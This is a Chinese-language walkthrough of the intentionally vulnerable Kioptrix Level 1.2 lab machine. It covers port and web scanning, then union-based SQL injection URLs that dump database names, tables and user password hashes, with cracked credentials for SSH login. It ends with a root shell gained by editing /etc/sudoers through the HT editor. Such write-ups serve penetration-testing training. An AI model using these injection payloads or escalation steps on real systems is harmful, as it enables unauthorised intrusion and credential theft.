# Kioptrix Level 1.2

下载地址：

```
https://download.vulnhub.com/kioptrix/KVM3.rar
```

## 实战操作

扫描端口

```
┌──(root💀kali)-[~/Desktop]
└─# nmap -sV -p1-65535 192.168.32.137                                                                                                                                                                                                  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-14 06:27 EST
Nmap scan report for 192.168.32.137
Host is up (0.0030s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: 00:0C:29:71:27:48 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.76 seconds
                                                                   
```

浏览器打开80端口

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

nikto扫描web服务，找到/phpmyadmin目录

```
┌──(root💀kali)-[~/Desktop]
└─# nikto -host 192.168.32.137       
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.32.137
+ Target Hostname:    192.168.32.137
+ Target Port:        80
+ Start Time:         2021-12-14 07:15:39 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 7914 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2021-12-14 07:16:01 (GMT-5) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

web系统要做host

```
┌──(root💀kali)-[~/Desktop]
└─# cat /etc/hosts
192.168.32.137 kioptrix3.com                       
```

找到两个页面。

![](<../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1).png>)

其中构造URL：http://kioptrix3.com/gallery/gallery.php?id=1，存在SQL注入漏洞。

![](<../../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1) (1) (1).png>)

联合注入

```
http://kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,2,3,4,5,6--%20-#&sort=photoid#
```

![](<../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

获取所有数据库

```
http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20%20SELECT%201,(select%20group_concat(SCHEMA_NAME)%20from%20information_schema.SCHEMATA),3,4,5,6--%20-#&sort=photoid#
```

![](<../../.gitbook/assets/image (1) (1).png>)

获取所有表名

```
http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20%20SELECT%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27gallery%27),3,4,5,6--%20-#&sort=photoid#
```

![](<../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1).png>)

获取列名

```
http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20ALL%20SELECT%201,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%27gallery%27%20and%20table_name=%27gallarific_users%27%20),3,4,5,6--%20-#&sort=photoid#
```

![](<../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1).png>)

获取内容

```
http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20ALL%20SELECT%201,(select%20group_concat(username,0x3a,password)%20from%20gallery.gallarific_users%20%20),3,4,5,6--%20-#&sort=photoid#
```

![](<../../.gitbook/assets/image (2) (1).png>)

遍历所有表之后，找到`dev_accounts`表。

![](<../../.gitbook/assets/image (9) (1).png>)

CMD5网站解密密文，得到密码。

```
dreg:0d3eccfb887aabd50f243b3f155c0f85(Mast3r)
loneferret:5badcaf789d3d1d09794d8f021f40f0e(starwars)
```

这两个账号能够登录进ssh

![](<../../.gitbook/assets/image (10) (1) (1) (1) (1).png>)

找到一个公司策略说明文档

```
dreg@Kioptrix3:~$ cat /home/loneferret/CompanyPolicy.README 
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
```

dreg账号使用，发现不被允许使用。

```
dreg@Kioptrix3:~$ sudo ht
[sudo] password for dreg: 
dreg is not in the sudoers file.  This incident will be reported.
```

使用loneferret账号，提示缺少终端环境变量

```
loneferret@Kioptrix3:~$ sudo ht
Error opening terminal: xterm-256color.
```

补充TERM环境变量内容

```
loneferret@Kioptrix3:~$ export TERM=xterm-color
loneferret@Kioptrix3:~$ sudo ht
```

![](<../../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1).png>)

按F3，进入到`/etc/sudoers`文件进行修改，添加`/bin/bash`，然后按F2保存

![](<../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

完成提权

```
loneferret@Kioptrix3:~$ sudo /bin/bash                                                                                                                                                                                                       
root@Kioptrix3:~# id                                                                                                                                                                                                                         
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                       
root@Kioptrix3:~# ls                                                                                                                                                                                                                         
checksec.sh  CompanyPolicy.README                                                                                                                                                                                                            
root@Kioptrix3:~# cat /root/
.bash_history   .bashrc         Congrats.txt    ht-2.0.18/      .mysql_history  .nano_history   .profile        .ssh/           .subversion/                                                                                                 
root@Kioptrix3:~# cat /root/Congrats.txt                                                                                                                                                                                                     
Good for you for getting here.                                                                                                                                                                                                               
Regardless of the matter (staying within the spirit of the game of course)                                                                                                                                                                   
you got here, congratulations are in order. Wasn't that bad now was it.                                                                                                                                                                      

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS: 
http://www.lotuscms.org

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```
